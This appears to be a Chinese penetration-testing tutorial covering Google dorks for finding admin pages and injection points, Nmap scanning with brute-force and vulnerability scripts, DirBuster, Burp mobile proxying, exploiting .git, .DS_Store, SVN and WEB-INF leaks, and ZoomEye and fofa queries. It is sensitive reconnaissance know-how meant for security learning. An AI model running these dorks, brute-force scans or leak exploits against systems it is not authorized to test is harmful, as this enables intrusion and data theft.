使用Google等搜索引擎对某些特定的网络主机漏洞（通常是服务器上的脚本漏洞）进行搜索，以达到快速找到漏洞主机或特定主机的漏洞的目的。Google毫无疑问是当今世界上最强大的搜索引擎。然而，在黑客手中，它也是一个秘密武器，它能搜索到一些你意想不到的信息。 1.6.2 部署**指南**a) 一台可以正常访问互联网的设备（通常为PC） b) 一个常用浏览器（IE、Chrome等等） c) 掌握强大的搜索关键词 1.6.3 实战​ Google搜索引擎之所以强大，关键在于它详细的搜索关键词，以下是几个常用的搜索关键词：（更多详细教程，参见http://user.qzone.qq.com/568311803/main） ​ inurl: 用于搜索网页上包含的URL. 这个语法对寻找网页上的搜索,帮助之类的很有用. intext: 只搜索网页部分中包含的文字(也就是忽略了标题,URL等的文字). site: 可以限制你搜索范围的域名. filetype: 搜索文件的后缀或者扩展名 intitle: 限制你搜索的网页标题. allintitle: 搜索所有关键字构成标题的网页. 但是推荐不要使用 link: 可以得到一个所有包含了某个指定URL的页面列表. 例如🔗www.google.com 就可以得到所有连接到Google的页面。 一般常见用法有： site:ooxx.com filetype:xls site**:xxx.xxx** admin site**:xxx.xxx** login site**:xxx.xxx** system site**:xxx.xxx** 管理 site**:xxx.xxx** 登录 site**:xxx.xxx** 内部 site**:xxx.xxx** 系统 site**:xxx.xxx** 邮件 site**:xxx.xxx** email site**:xxx.xxx** qq site**:xxx.xxx** 群 site**:xxx.xxx** 企鹅 site**:xxx.xxx** 腾讯 site:ooxx.com inurl:jmx-console 实例： intext:管理 filetype:mdb inurl:file site: baidu.com filetype:txt 查找TXT文件 其他的依次**类**推 site:baidu.com intext:管理 site:baidu.com inurl:login site:baidu.com intitle:后台 查看服务器使用的程序 site:baidu.com filetype:asp site:baidu.com filetype:php site:baidu.com filetype:jsp 查看上传漏洞： site:baidu**.com** inurl:file site: baidu**.com** inurl:load 查找注射点： site:tw inurl:asp?id= 这个是找台湾的 1.6.4 Google的优劣势​ 优势： l 只需一台可以访问Google的联网设备，部署简单； l 检索资源库丰富； 劣势： l 搜索关键词多，记忆复杂； l GoogleHack需要借助浏览器，属于在线工具，离线不能使用； l 国内访问Google需借助VPN等相关手段，增加了上网成本 1.7 Nmaphttp://blog.sina.com.cn/s/blog_811d9fdd0101ey07.html 功能介绍 http://www.cnblogs.com/c4isr/archive/2012/12/07/2807491.html 10种扫描方式解释 ​ 由于是在win7上面使用，所以要使用兼容win7的winpcap驱动，这里我们使用最新版4.1.2版 winpcap4.1.2下载地址：http://www.onlinedown.net/soft/2685.htm 1.7.1 功能**介绍**Nmap是一个网络连接端口扫描软件，用来扫描网上电脑开放的网络连接端口。确定哪些服务运行在哪些连接端口，并且推断计算机运行哪个操作系统。它是网络管理员必用的软件之一，以及用以评估网络系统安全。 功能架构图： 1.2.2 部署指南两种部署方式： l Kail集成环境 l 单独安装（使用yum工具直接安装就可以） 1.2.3 实战Nmap的参数和选项繁多，功能非常丰富。我们先来看一下Nmap的通用命令格式：（详细教程及下载方式参见：http://nmap.org/） Nmap**&lt;扫描选项&gt;&lt;扫描****目标****&gt;** (一) 主机发现 1) 主机发现原理主机发现的原理与Ping命令类似，发送探测包到目标主机，如果收到回复，那么说明目标主机是开启的。Nmap支持十多种不同的主机探测方式，比如发送ICMP ECHO/TIMESTAMP/NETMASK报文、发送TCPSYN/ACK包、发送SCTP INIT/COOKIE-ECHO包，用户可以在不同的条件下灵活选用不同的方式来探测目标机。 2) 主机发现**的基本用法**l -sL: List Scan 列表扫描，仅将指定的目标的IP列举出来，不进行主机发现。 l -sn: Ping Scan 只进行主机发现，不进行端口扫描。 l -Pn: 将所有指定的主机视作开启的，跳过主机发现的过程。 l -PS/PA/PU/PY[portlist]: 使用TCPSYN/ACK或SCTP INIT/ECHO方式进行发现。 l -PE/PP/PM: 使用ICMP echo, timestamp, and netmask 请求包发现主机。 l -PO[protocollist]: 使用IP协议包探测对方主机是否开启。 l -n/-R: -n表示不进行DNS解析；-R表示总是进行DNS解析。 l –dns-servers &lt;serv1[,serv2],…&gt;: 指定DNS服务器。 l –system-dns: 指定使用系统的DNS服务器 l –traceroute: 追踪每个路由节点 3) 使用**演示**扫描局域网10.1.1.1-10.1.1.100范围内哪些IP的主机是活动的。 ​ 命令如下：nmap –sn 10.1.1.1-100 由图可知：10.1.1.2、10.1.1.100两台主机处于存活状态。 (二) 端口**扫描** 1) 端口**扫描原理**端口扫描是Nmap最基本最核心的功能，用于确定目标主机的TCP/UDP端口的开放情况。默认情况下，Nmap会扫描1000个最有可能开放的TCP端口。Nmap通过探测将端口划分为6个状态：open：端口是开放的。closed：端口是关闭的。filtered：端口被防火墙IDS/IPS屏蔽，无法确定其状态。unfiltered：端口没有被屏蔽，但是否开放需要进一步确定。open|filtered：端口是开放的或被屏蔽。closed|filtered ：端口是关闭的或被屏蔽。 端口扫描方面非常强大，提供了很多的探测方式： l TCP SYN scanning l TCP connect scanning l TCP ACK scanning l TCP FIN/Xmas/NULL scanning l UDP scanning l 其他方式 2) 端口**扫描用法**l -sS/sT/sA/sW/sM:指定使用 TCP SYN/Connect()/ACK/Window/Maimon scans的方式来对目标主机进行扫描。 l -sU: 指定使用UDP扫描方式确定目标主机的UDP端口状况。 l -sN/sF/sX: 指定使用TCP Null, FIN, and Xmas scans秘密扫描方式来协助探测对方的TCP端口状态。 l –scanflags : 定制TCP包的flags。 l -sI &lt;zombiehost[:probeport]&gt;: 指定使用idle scan方式来扫描目标主机（前提需要找到合适的zombie host） l -sY/sZ: 使用SCTP INIT/COOKIE-ECHO来扫描SCTP协议端口的开放的情况。 l -sO: 使用IP protocol 扫描确定目标机支持的协议类型。 l -b : 使用FTP bounce scan扫描方式 3) 使用**演示**在此，我们以主机10.1.1.100为例。命令如下：nmap -sS -sU -T4 -top-ports 300 1.1.1.100 参数-sS表示使用TCP SYN方式扫描TCP端口；-sU表示扫描UDP端口；-T4表示时间级别配置4级；–top-ports 300表示扫描最有可能开放的300个端口（TCP和UDP分别有300个端口）。 (三) 版本**侦测** 1) 版本**侦测原理**简要的介绍版本的侦测原理。版本侦测主要分为以下几个步骤： l 首先检查open与open|filtered状态的端口是否在排除端口列表内。如果在排除列表，将该端口剔除。 l 如果是TCP端口，尝试建立TCP连接。尝试等待片刻（通常6秒或更多，具体时间可以查询文件nmap-services-probes中Probe TCP NULL q||对应的totalwaitms）。通常在等待时间内，会接收到目标机发送的“WelcomeBanner”信息。nmap将接收到的Banner与nmap-services-probes中NULL probe中的签名进行对比。查找对应应用程序的名字与版本信息。 l 如果通过“Welcome Banner”无法确定应用程序版本，那么nmap再尝试发送其他的探测包（即从nmap-services-probes中挑选合适的probe），将probe得到回复包与数据库中的签名进行对比。如果反复探测都无法得出具体应用，那么打印出应用返回报文，让用户自行进一步判定。 l 如果是UDP端口，那么直接使用nmap-services-probes中探测包进行探测匹配。根据结果对比分析出UDP应用服务类型。 l 如果探测到应用程序是SSL，那么调用openSSL进一步的侦查运行在SSL之上的具体的应用类型。 l 如果探测到应用程序是SunRPC，那么调用brute-force RPC grinder进一步探测具体服务。 2) 版本**侦测用法**l -sV: 指定让Nmap进行版本侦测 l –version-intensity : 指定版本侦测强度（0-9），默认为7。数值越高，探测出的服务越准确，但是运行时间会比较长。 l –version-light: 指定使用轻量侦测方式 (intensity 2) l –version-all: 尝试使用所有的probes进行侦测 (intensity 9) l –version-trace: 显示出详细的版本侦测过程信息。 3) 使用**演示**对主机10.1.1.100进行版本侦测。 命令如下：nmap –sV 10.1.1.100 (四) OS侦测 1) OS**侦测原理**Nmap使用TCP/IP协议栈指纹来识别不同的操作系统和设备。在RFC规范中，有些地方对TCP/IP的实现并没有强制规定，由此不同的TCP/IP方案中可能都有自己的特定方式。Nmap主要是根据这些细节上的差异来判断操作系统的类型的。具体实现方式如下：Nmap内部包含了2600多已知系统的指纹特征（在文件nmap-os-db文件中）。将此指纹数据库作为进行指纹对比的样本库。分别挑选一个open和closed的端口，向其发送经过精心设计的TCP/UDP/ICMP数据包，根据返回的数据包生成一份系统指纹。将探测生成的指纹与nmap-os-db中指纹进行对比，查找匹配的系统。如果无法匹配，以概率形式列举出可能的系统。 2) OS**侦测用法**l -O: 指定Nmap进行OS侦测。 l –osscan-limit: 限制Nmap只对确定的主机的进行OS探测（至少需确知该主机分别有一个open和closed的端口）。 l –osscan-guess: 大胆猜测对方的主机的系统类型。由此准确性会下降不少，但会尽可能多为用户提供潜在的操作系统。 3) 使用**演示**命令：nmap –O 10.1.1.100 (五) 漏洞扫描 扫描端口并且标记可以爆破的服务 nmap 目标 –script=ftp-brute,imap-brute,smtp-brute,pop3-brute,mongodb-brute,redis-brute,ms-sql-brute,rlogin-brute,rsync-brute,mysql-brute,pgsql-brute,oracle-sid-brute,oracle-brute,rtsp-url-brute,snmp-brute,svn-brute,telnet-brute,vnc-brute,xmpp-brute 判断常见的漏洞并扫描端口 nmap 目标 –script=auth,vuln 精确判断漏洞并扫描端口 nmap 目标 –script=dns-zone-transfer,ftp-anon,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,http-backup-finder,http-cisco-anyconnect,http-iis-short-name-brute,http-put,http-php-version,http-shellshock,http-robots.txt,http-svn-enum,http-webdav-scan,iis-buffer-overflow,iax2-version,memcached-info,mongodb-info,msrpc-enum,ms-sql-info,mysql-info,nrpe-enum,pptp-version,redis-info,rpcinfo,samba-vuln-cve-2012-1182,smb-vuln-ms08-067,smb-vuln-ms17-010,snmp-info,sshv1,xmpp-info,tftp-enum,teamspeak2-version 1.2.4 Nmap**的优劣势**优势： l 功能灵活强大，支持多种目标，大量计算机的同时扫描； l 开源，相关帮助文档十分详细； l 流行，由于其具有强大的扫描机探测功能，，已被成千上万安全专家使用。 劣势： l Nmap参数众多，难以一一记忆； 1.8 DirB**uster**1.8.1 功能**介绍**DirBuster是一款路径及网页暴力破解的工具,可以破解出一直没有访问过或者管理员后台的界面路径。 1.8.2 部署**指南**Java运行环境+DirBuster程序包 1.8.3 实战详细教程，参见： https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project http://sourceforge.net/projects/dirbuster/ l 双击运行DirBuster.jar l 在URL中输入目标URL或者主机IP地址 l 在file with list of dirs/files 栏后点击browse，选择破解的字典库为directory-list-2.3-small.txt l 将File extension中填入正确的文件后缀，默认为php，如果为jsp页面，需要填入jsp l 其他选项不变，点击右下角的start，启动目录查找 l 观察返回结果，可点击右下角的report，生成目录报告 1.8.4 DirBuster**优缺点**优点： l 敏感目录发掘能力强 l OWASP安全机构极力推荐 缺点： l 程序运行线程小 l 探测目录依赖字典文件 1.9 指纹识别 1.10 扩展：Burp APP抓包一、**手机端配置** **1.**让安卓手机和电脑连入同一个WIFI，即是在同一个无线局域网环境下。 **2.**查看电脑的本地IP地址，命令行下输入ipconfig。 无线局域网的IP地址**3.**设置手机代理IP，我这里以oppo系统为例。 代理设置为“手动”，设置主机名为电脑无线局域网IP地址，端口可以随便设置，其他的设置可以默认。 二、**电脑端配置** **1.**打开Burpsuite，设置Burp suite代理服务器，点击“Proxy”然后“Options” 点击“add”添加和手机一样的IP地址和端口，要跟手机上设置的那个端口一致。记得勾上前面的括号。**2.**设置好了后，在“Proxy”：〉“Intercept”下开启“Intercept is on”就可以对安卓APP的网络数据进行抓包了。 三、证书安装 ​ 抓取HTTPS包需要导入Burp的证书。**特别注意：一个Burp对应一个证书，就是用哪个Burp抓包就导出哪个的证书，并将该证书在手机上安装。非常重要，因为以前抓包安过证书但是用的不是同一个Burp导致抓包失败，浪费了很多时间。** 导出Burp证书步骤为： Proxy—Options—-import\\export CA 选择第一个，然后next 选择保存的CA路径，**文件后缀命名为.cer，非常重要，因为手机只能安装.cer的证书类型，默认的der格式是不能被识别安装的。** 将证书发送到手机，我是直接微信发送的，然后在微信中下载，并记住下载的目录。 找到下载的目录，将证书文件复制到手机存储的**根目录**。 打开手机设置–其它设置–安全和隐私–更多安全设置–从SD卡安装 到根目录下，找到.cer文件，安装.cer证书，重命名个名字 成功安装后，可以在手机—-设置—-安全和隐私—-更多安全设置—-受信任的凭据—-用户—-看到PortSwigger文件。 至此，安装完成。全部工作完成，可以打开burp，准备抓包了。 1.11 扩展:常见信息泄露利用方法一、Git导致文件泄露 ​ 由于目前的 web 项目的开发采用前后端完全分离的架构:前端全部使用静态文件，和后端代码完全分离，隶属两个不同的项目。表态文件使用 git 来进行同步发布到服务器，然后使用nginx 指向到指定目录，以达到被公网访问的目的。 在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码 二、DS_store导致文件泄露 ​ .DS_Store是Mac下Finder用来保存如何展示文件//文件夹的数据文件，每个文件夹下对应一个。由于开发/设计人员在发布代码时未删除文件夹中隐藏的.DS_store，可能造成文件目录结构泄漏、源代码文件等敏感信息的泄露。我们可以模仿一个环境，利用phpstudy搭建PHP环境，把.DS_store文件上传到相关目录。 然后利用工具进行相关检测工具下载地址：https://github.com/lijiejie/ds_store_exp为了让实验更真实，我们在本地搭建环境，然后建立一个文件夹为admin和一个hello文件夹，利用该工具运行完以后，查看工具文件夹查看有什么结果。 此文件和我们在一个文件夹内，如果是苹果用户，把文件copy到相关服务器目录以后，都会默认带一个文件.DS_Store。首先访问test.php文件，查看环境是否成功。 环境搭建成功 我们利用工具进行测试，运行完如上图，运行完以后我们可以到工具目录进行查看 这是一个.DS_Store文件泄漏利用脚本，它解析.DS_Store文件并递归地下载文件到本地。 三、SVN导致文件泄露 ​ Subversion，简称SVN，是一个开放源代码的版本控制系统，相对于的RCS、CVS，采用了分支管理系统，它的设计目标就是取代CVS。互联网上越来越多的控制服务从CVS转移到Subversion。 Subversion使用服务端—客户端的结构，当然服务端与客户端可以都运行在同一台服务器上。在服务端是存放着所有受控制数据的Subversion仓库，另一端是Subversion的客户端程序，管理着受控数据的一部分在本地的映射（称为“工作副本”）。在这两端之间，是通过各种仓库存取层（Repository Access，简称RA）的多条通道进行访问的。这些通道中，可以通过不同的网络协议，例如HTTP、SSH等，或本地文件的方式来对仓库进行操作。SVN漏洞在实际渗透测试过程中，利用到也比较多，由于一些开发管理员疏忽造成，原理类似DS_Store漏洞。我们这里不再进行搭建环境，给大家推荐工具，利用方法如下： 漏洞利用工具： Seay SVN漏洞利用工具 添加网站url在被利用的网址后面加 /.svn/entries，列出网站目录，甚至下载整站下载地址：https://pan.baidu.com/s/1jGA98jG 四**、WEB-INF/web.xml泄露** WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。 WEB-INF主要包含一下文件或目录： /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。 /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中 /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件 /WEB-INF/src/：源码目录，按照包名结构放置各个java文件。 /WEB-INF/database.properties：数据库配置文件 原因：通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取 1.12 扩展: ZoomEye hack​ ZoomEye 支持公网设备指纹检索和 Web指纹检索的网站，指纹检索包括应用名称、版本、前端框架、后端框架、服务端语言、服务器操作系统、网站容器、内容管理系统和数据库等。设备指纹包括应用名、版本、开放端口、操作系统、服务名、地理位置等。 1**、实战搜索** 我们今天主要讲下如何使用他的语法规则去高级搜索，搜索有用信息。 · 主机设备搜索组件名称app: 组件名ver: 组件版本例1：搜索使用iis6.0主机：app:”Microsoft-IIS” ver”6.0”，可以看到0.6秒搜索到41，781,210左右的使用iis6.0的主机。 例2：搜索使weblogic主机：app:”weblogic httpd” port:7001，可以看到0.078秒搜索到42万左右的使用weblogic的主机。 例3：查询开放3389端口的主机：port:3389 例4：查询操作系统为Linux系统的服务器，os:linux 例5：查询公网摄像头：service:”routersetup” 例6：搜索美国的 Apache 服务器：app:Apache country:US 后面还可以接city: 城市名称 例7：搜索指定ip信息，ip:121.42.173.26 例8：查询有关taobao.com域名的信息，site:taobao.com 例9：搜索标题中包含该字符的网站，title:weblogic 例10：keywords:Nginx 1.13 扩展: fofa hackdomain=””||ip=””||host=””||title=””||header=””protocol=”https”，搜索指定协议类型 app=”phpinfo”搜索某些组件相关系统 host=”oldboyedu.com/“搜索包含有特定字符的URL title=”powered by” &amp;&amp; os==windows搜索网页标题中包含有特定字符并且系统是windows的网页 详细请看官方详细文档; https://fofa.so/help https://github.com/Threezh1/JSFinder","tags":[{"name":"网络安全","slug":"网络安全","permalink":"https://zhangyanlady.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"渗透测试","slug":"渗透测试","permalink":"https://zhangyanlady.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]}]